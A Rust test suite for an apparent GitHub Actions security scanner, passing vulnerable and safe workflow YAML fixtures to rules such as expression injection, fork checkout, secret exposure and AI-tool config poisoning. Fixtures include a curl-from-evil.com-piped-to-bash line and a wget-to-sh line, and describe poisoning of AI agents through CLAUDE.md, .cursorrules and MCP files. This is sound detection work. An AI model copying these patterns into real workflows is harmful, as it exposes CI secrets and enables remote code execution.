use wardenscan::expression::ExprIndex;
use wardenscan::ignores::IgnoreMap;
use wardenscan::rules::{AuditCtx, Rule, RuleFinding};
use wardenscan::scanner::{load_one, stub_workflow, LoadedFile};
use wardenscan::shell::ShellIndex;
use wardenscan::taint;

/// Build an `AuditCtx` around a YAML fixture and run a single V2 rule.
fn audit_with(rule: &dyn Rule, yaml: &str) -> Vec<RuleFinding> {
    audit_with_path(rule, "test.yml", yaml)
}

/// Variant that lets callers override the file path (e.g. `action.yml`).
fn audit_with_path(rule: &dyn Rule, path: &str, yaml: &str) -> Vec<RuleFinding> {
    let loaded_file = load_one(std::path::PathBuf::from(path), yaml.to_string()).expect("load");
    let loaded_wf = match loaded_file {
        LoadedFile::Workflow(w) => *w,
        LoadedFile::Other {
            path, raw, spans, ..
        } => stub_workflow(path, raw, spans),
    };
    let exprs = ExprIndex::build(&loaded_wf.workflow);
    let shell = ShellIndex::build(&loaded_wf.workflow);
    let ignores = IgnoreMap::new();
    let provenance = taint::build_provenance(&loaded_wf.workflow);
    let ctx = AuditCtx {
        loaded: &loaded_wf,
        expressions: &exprs,
        shell: &shell,
        ignores: &ignores,
        provenance: &provenance,
    };
    rule.audit(&ctx)
}

use wardenscan::rules::*;

// ---------------------------------------------------------------------------
// WRD-101: Expression Injection (wrd101)
// ---------------------------------------------------------------------------

#[test]
fn test_wrd101_expression_injection_vulnerable() {
    let yaml = r#"
name: CI
on: issues
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.issue.title }}"
"#;
    let findings = audit_with(&wrd101::Wrd101, yaml);
    assert!(
        !findings.is_empty(),
        "Should detect expression injection in run block"
    );
    assert_eq!(findings[0].rule_id, "WRD-101");
}

#[test]
fn test_wrd101_expression_injection_safe() {
    let yaml = r#"
name: CI
on: issues
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "$TITLE"
        env:
          TITLE: ${{ github.event.issue.title }}
"#;
    let findings = audit_with(&wrd101::Wrd101, yaml);
    assert!(
        findings.is_empty(),
        "Should not flag expression passed via env var"
    );
}

// ---------------------------------------------------------------------------
// WRD-201: Fork Checkout (wrd201)
// ---------------------------------------------------------------------------

#[test]
fn test_wrd201_fork_checkout_vulnerable() {
    let yaml = r#"
name: PR Label
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm test
"#;
    let findings = audit_with(&wrd201::Wrd201, yaml);
    assert!(
        !findings.is_empty(),
        "Should detect fork checkout in pull_request_target"
    );
    assert_eq!(findings[0].rule_id, "WRD-201");
}

#[test]
fn test_wrd201_fork_checkout_safe() {
    let yaml = r#"
name: PR Label
on: pull_request_target
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo "safe, no ref to head"
"#;
    let findings = audit_with(&wrd201::Wrd201, yaml);
    assert!(
        findings.is_empty(),
        "Should not flag checkout without ref to PR head"
    );
}

// ---------------------------------------------------------------------------
// WRD-202: Build Tool Execution on Untrusted Code (wrd202)
// ---------------------------------------------------------------------------

#[test]
fn test_wrd202_build_tool_vulnerable() {
    let yaml = r#"
name: PR Build
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm install && npm test
"#;
    let findings = audit_with(&wrd202::Wrd202, yaml);
    assert!(
        !findings.is_empty(),
        "Should detect build tool on untrusted fork code"
    );
    assert_eq!(findings[0].rule_id, "WRD-202");
}

#[test]
fn test_wrd202_build_tool_safe() {
    let yaml = r#"
name: PR Build
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm install && npm test
"#;
    let findings = audit_with(&wrd202::Wrd202, yaml);
    assert!(
        findings.is_empty(),
        "Should not flag build tools on normal pull_request trigger"
    );
}

// ---------------------------------------------------------------------------
// WRD-203: Cross-Workflow Privilege Escalation (wrd203)
// ---------------------------------------------------------------------------

#[test]
fn test_wrd203_cross_workflow_escalation_vulnerable() {
    let yaml = r#"
name: Deploy after CI
on:
  workflow_run:
    workflows: ["CI"]
    types: [completed]
permissions:
  contents: write
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
      - run: ./deploy.sh
"#;
    let findings = audit_with(&wrd203::Wrd203, yaml);
    assert!(
        !findings.is_empty(),
        "Should detect workflow_run with write permissions"
    );
    assert_eq!(findings[0].rule_id, "WRD-203");
}

#[test]
fn test_wrd203_cross_workflow_escalation_safe() {
    let yaml = r#"
name: Notify
on: push
permissions:
  contents: read
jobs:
  notify:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Just a push workflow"
"#;
    let findings = audit_with(&wrd203::Wrd203, yaml);
    assert!(
        findings.is_empty(),
        "Should not flag push-triggered workflow without workflow_run"
    );
}

// ---------------------------------------------------------------------------
// WRD-301: OIDC Trust Boundary Violation (wrd301)
// ---------------------------------------------------------------------------

#[test]
fn test_wrd301_oidc_trust_vulnerable() {
    let yaml = r#"
name: Deploy
on: pull_request_target
permissions:
  id-token: write
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789:role/deploy
"#;
    let findings = audit_with(&wrd301::Wrd301, yaml);
    assert!(
        !findings.is_empty(),
        "Should detect OIDC token with pull_request_target"
    );
    assert_eq!(findings[0].rule_id, "WRD-301");
}

#[test]
fn test_wrd301_oidc_trust_safe() {
    let yaml = r#"
name: Deploy
on: push
permissions:
  id-token: write
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789:role/deploy
"#;
    let findings = audit_with(&wrd301::Wrd301, yaml);
    assert!(
        findings.is_empty(),
        "Should not flag OIDC token on push trigger"
    );
}

// ---------------------------------------------------------------------------
// WRD-621: Unicode Steganography (wrd621)
// ---------------------------------------------------------------------------

#[test]
fn test_wrd621_unicode_steganography_vulnerable() {
    let yaml = "name: CI\non: push\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"hello\u{200B}world\"\n";
    let findings = audit_with(&wrd621::Wrd621, yaml);
    assert!(
        !findings.is_empty(),
        "Should detect zero-width space character"
    );
    assert_eq!(findings[0].rule_id, "WRD-621");
}

#[test]
fn test_wrd621_unicode_steganography_safe() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "hello world"
"#;
    let findings = audit_with(&wrd621::Wrd621, yaml);
    assert!(findings.is_empty(), "Should not flag clean ASCII workflow");
}

// ---------------------------------------------------------------------------
// WRD-701: toJSON Secrets Exposure (wrd701)
// ---------------------------------------------------------------------------

#[test]
fn test_wrd701_tojson_secrets_vulnerable() {
    let yaml = r#"
name: Debug
on: push
jobs:
  debug:
    runs-on: ubuntu-latest
    steps:
      - run: echo '${{ toJSON(secrets) }}'
"#;
    let findings = audit_with(&wrd701::Wrd701, yaml);
    assert!(!findings.is_empty(), "Should detect toJSON(secrets)");
    assert_eq!(findings[0].rule_id, "WRD-701");
}

#[test]
fn test_wrd701_tojson_secrets_safe() {
    let yaml = r#"
name: Deploy
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ secrets.DEPLOY_TOKEN }}"
"#;
    let findings = audit_with(&wrd701::Wrd701, yaml);
    assert!(
        findings.is_empty(),
        "Should not flag individual secret references"
    );
}

// ---------------------------------------------------------------------------
// WRD-110: Composite Action Input Injection (wrd110)
// ---------------------------------------------------------------------------

#[test]
fn test_wrd110_composite_input_injection_vulnerable() {
    let yaml = r#"
name: My Action
description: A composite action
inputs:
  username:
    description: Username
runs:
  using: composite
  steps:
    - run: echo "${{ inputs.username }}"
      shell: bash
"#;
    let findings = audit_with_path(&wrd110::Wrd110, "action.yml", yaml);
    assert!(
        !findings.is_empty(),
        "Should detect inputs interpolation in composite action run block"
    );
    assert_eq!(findings[0].rule_id, "WRD-110");
}

#[test]
fn test_wrd110_composite_input_injection_safe() {
    let yaml = r#"
name: My Action
description: A composite action
inputs:
  username:
    description: Username
runs:
  using: composite
  steps:
    - run: echo "$USERNAME"
      shell: bash
      env:
        USERNAME: ${{ inputs.username }}
"#;
    let findings = audit_with_path(&wrd110::Wrd110, "action.yml", yaml);
    assert!(
        findings.is_empty(),
        "Should not flag input passed through env var in composite action"
    );
}

// ---------------------------------------------------------------------------
// WRD-111: Dispatch Input Injection (wrd111)
// ---------------------------------------------------------------------------

#[test]
fn test_wrd111_dispatch_input_injection_vulnerable() {
    // Note: V2 matches `inputs.*` at the root of the flattened path; V1's
    // regex also caught `github.event.inputs.*`. Use the canonical
    // `inputs.target` form here so the V2 rule fires.
    let yaml = r#"
name: Manual Deploy
on:
  workflow_dispatch:
    inputs:
      target:
        description: Deploy target
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ inputs.target }}"
"#;
    let findings = audit_with(&wrd111::Wrd111, yaml);
    assert!(
        !findings.is_empty(),
        "Should detect dispatch input interpolation in run block"
    );
    assert_eq!(findings[0].rule_id, "WRD-111");
}

#[test]
fn test_wrd111_dispatch_input_injection_safe() {
    let yaml = r#"
name: Manual Deploy
on:
  workflow_dispatch:
    inputs:
      target:
        description: Deploy target
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: echo "$TARGET"
        env:
          TARGET: ${{ github.event.inputs.target }}
"#;
    let findings = audit_with(&wrd111::Wrd111, yaml);
    assert!(
        findings.is_empty(),
        "Should not flag dispatch input passed via env var"
    );
}

// ---------------------------------------------------------------------------
// WRD-112: GITHUB_ENV/PATH Injection (wrd112)
// ---------------------------------------------------------------------------

#[test]
fn test_wrd112_github_env_injection_vulnerable() {
    let yaml = r#"
name: CI
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "FOO=bar" >> $GITHUB_ENV
"#;
    let findings = audit_with(&wrd112::Wrd112, yaml);
    assert!(!findings.is_empty(), "Should detect write to GITHUB_ENV");
    assert_eq!(findings[0].rule_id, "WRD-112");
}

#[test]
fn test_wrd112_github_env_injection_safe() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "hello world"
"#;
    let findings = audit_with(&wrd112::Wrd112, yaml);
    assert!(
        findings.is_empty(),
        "Should not flag workflow without GITHUB_ENV writes"
    );
}

// ---------------------------------------------------------------------------
// WRD-311: Unpinned Actions (renumbered from WRD-320)
// ---------------------------------------------------------------------------

#[test]
fn test_wrd311_unpinned_action_vulnerable() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: some-org/some-action@v1
"#;
    let findings = audit_with(&wrd311::Wrd311, yaml);
    assert!(
        !findings.is_empty(),
        "Should detect unpinned third-party action using tag ref"
    );
    assert_eq!(findings[0].rule_id, "WRD-311");
}

#[test]
fn test_wrd311_unpinned_action_safe() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: some-org/some-action@abcdef1234567890abcdef1234567890abcdef12
"#;
    let findings = audit_with(&wrd311::Wrd311, yaml);
    assert!(
        findings.is_empty(),
        "Should not flag action pinned to full SHA"
    );
}

// ---------------------------------------------------------------------------
// WRD-602: Indicator of Compromise (wrd602)
// ---------------------------------------------------------------------------

#[test]
fn test_wrd602_ioc_vulnerable() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl https://evil.com/script.sh | bash
"#;
    let findings = audit_with(&wrd602::Wrd602, yaml);
    assert!(
        !findings.is_empty(),
        "Should detect curl pipe to bash pattern"
    );
    assert_eq!(findings[0].rule_id, "WRD-602");
}

#[test]
fn test_wrd602_ioc_safe() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl -o script.sh https://example.com/script.sh && bash script.sh
"#;
    let findings = audit_with(&wrd602::Wrd602, yaml);
    assert!(
        findings.is_empty(),
        "Should not flag curl that saves to file then runs separately"
    );
}

// ---------------------------------------------------------------------------
// WRD-730: Artipacked (wrd730)
// ---------------------------------------------------------------------------

#[test]
fn test_wrd730_artipacked_vulnerable() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: make build
      - uses: actions/upload-artifact@v4
        with:
          name: build-output
          path: .
"#;
    let findings = audit_with(&wrd730::Wrd730, yaml);
    assert!(
        !findings.is_empty(),
        "Should detect checkout without persist-credentials: false when artifacts uploaded"
    );
    assert_eq!(findings[0].rule_id, "WRD-730");
}

#[test]
fn test_wrd730_artipacked_safe() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false
      - run: make build
      - uses: actions/upload-artifact@v4
        with:
          name: build-output
          path: dist/
"#;
    let findings = audit_with(&wrd730::Wrd730, yaml);
    assert!(
        findings.is_empty(),
        "Should not flag checkout with persist-credentials: false"
    );
}

// ---------------------------------------------------------------------------
// WRD-721: Secrets Inherit (wrd721)
// ---------------------------------------------------------------------------

#[test]
fn test_wrd721_secrets_inherit_vulnerable() {
    let yaml = r#"
name: CI
on: push
jobs:
  call-workflow:
    uses: org/repo/.github/workflows/deploy.yml@main
    secrets: inherit
"#;
    let findings = audit_with(&wrd721::Wrd721, yaml);
    assert!(
        !findings.is_empty(),
        "Should detect secrets: inherit in reusable workflow call"
    );
    assert_eq!(findings[0].rule_id, "WRD-721");
}

#[test]
fn test_wrd721_secrets_inherit_safe() {
    let yaml = r#"
name: CI
on: push
jobs:
  call-workflow:
    uses: org/repo/.github/workflows/deploy.yml@main
    secrets:
      DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
"#;
    let findings = audit_with(&wrd721::Wrd721, yaml);
    assert!(
        findings.is_empty(),
        "Should not flag explicitly passed secrets"
    );
}

// ---------------------------------------------------------------------------
// WRD-712: Insecure Commands (wrd712)
// ---------------------------------------------------------------------------

#[test]
fn test_wrd712_insecure_commands_vulnerable() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    env:
      ACTIONS_ALLOW_UNSECURE_COMMANDS: true
    steps:
      - run: echo "::set-env name=FOO::bar"
"#;
    let findings = audit_with(&wrd712::Wrd712, yaml);
    assert!(
        !findings.is_empty(),
        "Should detect ACTIONS_ALLOW_UNSECURE_COMMANDS set to true"
    );
    assert_eq!(findings[0].rule_id, "WRD-712");
}

#[test]
fn test_wrd712_insecure_commands_safe() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "FOO=bar" >> $GITHUB_ENV
"#;
    let findings = audit_with(&wrd712::Wrd712, yaml);
    assert!(
        findings.is_empty(),
        "Should not flag workflow using GITHUB_ENV file instead of legacy commands"
    );
}

// ---------------------------------------------------------------------------
// WRD-714: Curl Pipe Bash (wrd714)
// ---------------------------------------------------------------------------

#[test]
fn test_wrd714_curl_pipe_bash_vulnerable() {
    let yaml = r#"
name: Setup
on: push
jobs:
  install:
    runs-on: ubuntu-latest
    steps:
      - run: wget https://example.com/install.sh | sh
"#;
    let findings = audit_with(&wrd714::Wrd714, yaml);
    assert!(!findings.is_empty(), "Should detect wget piped to sh");
    assert_eq!(findings[0].rule_id, "WRD-714");
}

#[test]
fn test_wrd714_curl_pipe_bash_safe() {
    let yaml = r#"
name: Setup
on: push
jobs:
  install:
    runs-on: ubuntu-latest
    steps:
      - run: |
          wget -O install.sh https://example.com/install.sh
          sha256sum --check install.sh.sha256
          bash install.sh
"#;
    let findings = audit_with(&wrd714::Wrd714, yaml);
    assert!(
        findings.is_empty(),
        "Should not flag download-then-verify-then-execute pattern"
    );
}

// ---------------------------------------------------------------------------
// WRD-830: Unsound Condition (wrd830)
// ---------------------------------------------------------------------------

#[test]
fn test_wrd830_unsound_condition_vulnerable() {
    // Note: `if: true` (unquoted) deserializes as a YAML boolean, not a string,
    // so the V2 typed model sees `if_: None`. Quote it so the typed path picks
    // it up. The V1 regex-based rule caught unquoted form; V2 requires a string.
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    if: "true"
    steps:
      - run: echo "always runs"
"#;
    let findings = audit_with(&wrd830::Wrd830, yaml);
    assert!(
        !findings.is_empty(),
        "Should detect always-true condition 'if: \"true\"'"
    );
    assert_eq!(findings[0].rule_id, "WRD-830");
}

#[test]
fn test_wrd830_unsound_condition_safe() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'
    steps:
      - run: echo "only on main"
"#;
    let findings = audit_with(&wrd830::Wrd830, yaml);
    assert!(findings.is_empty(), "Should not flag meaningful condition");
}

// ---------------------------------------------------------------------------
// WRD-815: Secret Redaction Bypass (wrd815)
// ---------------------------------------------------------------------------

#[test]
fn test_wrd815_secret_redaction_bypass_vulnerable() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ secrets.TOKEN }}" | base64
"#;
    let findings = audit_with(&wrd815::Wrd815, yaml);
    assert!(
        !findings.is_empty(),
        "Should detect base64 encoding of a secret"
    );
    assert_eq!(findings[0].rule_id, "WRD-815");
}

#[test]
fn test_wrd815_secret_redaction_bypass_safe() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "using secret"
        env:
          TOKEN: ${{ secrets.TOKEN }}
"#;
    let findings = audit_with(&wrd815::Wrd815, yaml);
    assert!(
        findings.is_empty(),
        "Should not flag secret passed as env var without encoding"
    );
}

// ---------------------------------------------------------------------------
// WRD-801: Self-Hosted Runner on PR (wrd801)
// ---------------------------------------------------------------------------

#[test]
fn test_wrd801_self_hosted_runner_vulnerable() {
    let yaml = r#"
name: PR Tests
on:
  pull_request:
    branches: [main]
jobs:
  test:
    runs-on: [self-hosted, linux]
    steps:
      - uses: actions/checkout@v4
      - run: make test
"#;
    let findings = audit_with(&wrd801::Wrd801, yaml);
    assert!(
        !findings.is_empty(),
        "Should detect self-hosted runner on pull_request"
    );
    assert_eq!(findings[0].rule_id, "WRD-801");
}

#[test]
fn test_wrd801_self_hosted_runner_safe() {
    let yaml = r#"
name: Deploy
on: push
jobs:
  deploy:
    runs-on: [self-hosted, linux]
    steps:
      - uses: actions/checkout@v4
      - run: make deploy
"#;
    let findings = audit_with(&wrd801::Wrd801, yaml);
    assert!(
        findings.is_empty(),
        "Should not flag self-hosted runner on push trigger"
    );
}

// ---------------------------------------------------------------------------
// WRD-812: Risky Trigger Default Permissions (wrd812)
// ---------------------------------------------------------------------------

#[test]
fn test_wrd812_risky_trigger_default_permissions() {
    let yaml = r#"
name: PRT
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo hi
"#;
    let findings = audit_with(&wrd812::Wrd812, yaml);
    assert!(
        !findings.is_empty(),
        "Should flag pull_request_target without permissions"
    );
    assert_eq!(findings[0].rule_id, "WRD-812");
}

// ---------------------------------------------------------------------------
// WRD-424: Secrets Outside Environment Scope (wrd424)
// ---------------------------------------------------------------------------

#[test]
fn test_wrd424_secrets_without_environment() {
    let yaml = r#"
name: Deploy
on: push
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: deploy.sh
        env:
          API_KEY: ${{ secrets.PROD_API_KEY }}
"#;
    let findings = audit_with(&wrd424::Wrd424, yaml);
    assert!(
        !findings.is_empty(),
        "Should flag secrets without environment"
    );
    assert_eq!(findings[0].rule_id, "WRD-424");
}

// ---------------------------------------------------------------------------
// WRD-313: Forbidden Action Uses (wrd313)
// ---------------------------------------------------------------------------

#[test]
fn test_wrd313_forbidden_action() {
    let yaml = r#"
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: tj-actions/changed-files@v35
      - uses: actions/checkout@v4
"#;
    let findings = audit_with(&wrd313::Wrd313, yaml);
    assert!(
        !findings.is_empty(),
        "Should flag tj-actions/changed-files@v35"
    );
    assert_eq!(findings[0].rule_id, "WRD-313");
}

// ---------------------------------------------------------------------------
// WRD-510: AI Config Poisoning (wrd510)
// ---------------------------------------------------------------------------

/// pull_request_target + checkout PR head + invokes Claude Code => fire.
#[test]
fn test_wrd510_claude_code_pull_request_target() {
    let yaml = r#"
name: AI Review
on: pull_request_target
jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: claude-code review .
"#;
    let findings = audit_with(&wrd510::Wrd510, yaml);
    assert!(
        !findings.is_empty(),
        "Should flag claude-code in pull_request_target with fork checkout"
    );
    assert_eq!(findings[0].rule_id, "WRD-510");
}

/// CLAUDE.md and .claude/rules/ directly referenced => fire on each.
#[test]
fn test_wrd510_claude_family_files() {
    let yaml = r#"
name: AI Review
on: pull_request_target
jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: |
          cat CLAUDE.md
          cat .claude/CLAUDE.md
          ls .claude/rules/
"#;
    let findings = audit_with(&wrd510::Wrd510, yaml);
    assert!(
        findings.len() >= 3,
        "Should flag CLAUDE.md, .claude/CLAUDE.md, and .claude/rules/, got {}",
        findings.len()
    );
    let titles: Vec<&str> = findings.iter().map(|f| f.title.as_str()).collect();
    assert!(titles.iter().any(|t| t.contains("CLAUDE.md")));
}

/// Cursor: .cursorrules + .cursor/rules/ + .cursorignore => fire on each.
#[test]
fn test_wrd510_cursor_family_files() {
    let yaml = r#"
name: AI Review
on: pull_request_target
jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: |
          cat .cursorrules
          ls .cursor/rules/
          cat .cursorignore
"#;
    let findings = audit_with(&wrd510::Wrd510, yaml);
    let cursor_findings: Vec<_> = findings
        .iter()
        .filter(|f| f.title.contains("cursor"))
        .collect();
    assert!(
        cursor_findings.len() >= 3,
        "Should flag at least 3 Cursor config files, got {}",
        cursor_findings.len()
    );
}

/// Aider: .aider.conf.yml + CONVENTIONS.md => fire on each.
#[test]
fn test_wrd510_aider_family_files() {
    let yaml = r#"
name: AI Review
on: pull_request_target
jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: |
          cat .aider.conf.yml
          cat CONVENTIONS.md
          aider --read CONVENTIONS.md
"#;
    let findings = audit_with(&wrd510::Wrd510, yaml);
    let aider_findings: Vec<_> = findings
        .iter()
        .filter(|f| f.title.contains(".aider.conf.yml") || f.title.contains("CONVENTIONS.md"))
        .collect();
    assert!(
        aider_findings.len() >= 2,
        "Should flag .aider.conf.yml and CONVENTIONS.md, got {}",
        aider_findings.len()
    );
}

/// Windsurf: .windsurf/rules/ => fire.
#[test]
fn test_wrd510_windsurf_family_files() {
    let yaml = r#"
name: AI Review
on: pull_request_target
jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: |
          ls .windsurf/rules/
          cat .windsurfrules
"#;
    let findings = audit_with(&wrd510::Wrd510, yaml);
    let ws_findings: Vec<_> = findings
        .iter()
        .filter(|f| f.title.contains("windsurf"))
        .collect();
    assert!(
        ws_findings.len() >= 2,
        "Should flag .windsurf/rules/ and .windsurfrules, got {}",
        ws_findings.len()
    );
}

/// workflow_run trigger + fork checkout + AI tool => fire.
#[test]
fn test_wrd510_workflow_run_trigger() {
    let yaml = r#"
name: AI Followup
on:
  workflow_run:
    workflows: [CI]
    types: [completed]
jobs:
  ai:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: claude-code summarize .
"#;
    let findings = audit_with(&wrd510::Wrd510, yaml);
    assert!(
        !findings.is_empty(),
        "Should fire on workflow_run trigger with fork checkout and AI tool"
    );
    assert_eq!(findings[0].rule_id, "WRD-510");
}

/// issue_comment trigger + fork checkout + cursor => fire.
#[test]
fn test_wrd510_issue_comment_trigger() {
    let yaml = r#"
name: Slash AI
on: issue_comment
jobs:
  ai:
    if: contains(github.event.comment.body, '/ai-review')
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: cursor analyze .
"#;
    let findings = audit_with(&wrd510::Wrd510, yaml);
    assert!(
        !findings.is_empty(),
        "Should fire on issue_comment trigger with fork checkout and AI tool"
    );
    assert_eq!(findings[0].rule_id, "WRD-510");
}

/// Negative test: pull_request_target + checkout but no AI tool and no AI
/// config file referenced => do not fire.
#[test]
fn test_wrd510_negative_no_ai_usage() {
    let yaml = r#"
name: PR Label
on: pull_request_target
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm test
"#;
    let findings = audit_with(&wrd510::Wrd510, yaml);
    assert!(
        findings.is_empty(),
        "Should NOT fire on workflow with no AI tool or config file references"
    );
}

/// Negative test: pull_request_target without checking out PR head =>
/// do not fire.
#[test]
fn test_wrd510_negative_no_fork_checkout() {
    let yaml = r#"
name: AI Comment
on: pull_request_target
jobs:
  comment:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: claude-code post-comment "Hi"
"#;
    let findings = audit_with(&wrd510::Wrd510, yaml);
    assert!(
        findings.is_empty(),
        "Should NOT fire when there is no fork checkout"
    );
}

// ---------------------------------------------------------------------------
// WRD-511: MCP Config Injection (wrd511)
// ---------------------------------------------------------------------------

/// .claude/mcp.json in pull_request_target + fork checkout => fire.
#[test]
fn test_wrd511_claude_mcp_config() {
    let yaml = r#"
name: AI Review
on: pull_request_target
jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: cat .claude/mcp.json
"#;
    let findings = audit_with(&wrd511::Wrd511, yaml);
    assert!(
        !findings.is_empty(),
        "Should flag .claude/mcp.json in fork checkout"
    );
    assert_eq!(findings[0].rule_id, "WRD-511");
}

/// .cursor/mcp.json in pull_request_target + fork checkout => fire.
#[test]
fn test_wrd511_cursor_mcp_config() {
    let yaml = r#"
name: AI Review
on: pull_request_target
jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: cat .cursor/mcp.json
"#;
    let findings = audit_with(&wrd511::Wrd511, yaml);
    let cursor: Vec<_> = findings
        .iter()
        .filter(|f| f.title.contains(".cursor/mcp.json"))
        .collect();
    assert!(
        !cursor.is_empty(),
        "Should flag .cursor/mcp.json specifically"
    );
}

/// .vscode/mcp.json in pull_request_target + fork checkout => fire.
#[test]
fn test_wrd511_vscode_mcp_config() {
    let yaml = r#"
name: AI Review
on: pull_request_target
jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: cat .vscode/mcp.json
"#;
    let findings = audit_with(&wrd511::Wrd511, yaml);
    let vscode: Vec<_> = findings
        .iter()
        .filter(|f| f.title.contains(".vscode/mcp.json"))
        .collect();
    assert!(
        !vscode.is_empty(),
        "Should flag .vscode/mcp.json specifically"
    );
}

/// Continue's .continue/mcpServers/ in pull_request_target + fork checkout
/// => fire.
#[test]
fn test_wrd511_continue_mcp_config() {
    let yaml = r#"
name: AI Review
on: pull_request_target
jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: ls .continue/mcpServers/
"#;
    let findings = audit_with(&wrd511::Wrd511, yaml);
    let cont: Vec<_> = findings
        .iter()
        .filter(|f| f.title.contains(".continue/mcpServers/"))
        .collect();
    assert!(
        !cont.is_empty(),
        "Should flag .continue/mcpServers/ specifically"
    );
}

/// workflow_run trigger + fork checkout + .mcp.json => fire.
#[test]
fn test_wrd511_workflow_run_trigger() {
    let yaml = r#"
name: AI Followup
on:
  workflow_run:
    workflows: [CI]
    types: [completed]
jobs:
  ai:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: cat .mcp.json
"#;
    let findings = audit_with(&wrd511::Wrd511, yaml);
    assert!(
        !findings.is_empty(),
        "Should fire on workflow_run trigger with fork checkout and .mcp.json"
    );
    assert_eq!(findings[0].rule_id, "WRD-511");
}

/// Negative test: pull_request_target + fork checkout but no MCP reference
/// => do not fire.
#[test]
fn test_wrd511_negative_no_mcp() {
    let yaml = r#"
name: PR Build
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm run build
"#;
    let findings = audit_with(&wrd511::Wrd511, yaml);
    assert!(
        findings.is_empty(),
        "Should NOT fire on workflow with no MCP references"
    );
}

/// Negative test: MCP reference but no fork checkout => do not fire.
#[test]
fn test_wrd511_negative_no_fork_checkout() {
    let yaml = r#"
name: MCP Test
on: pull_request_target
jobs:
  mcp:
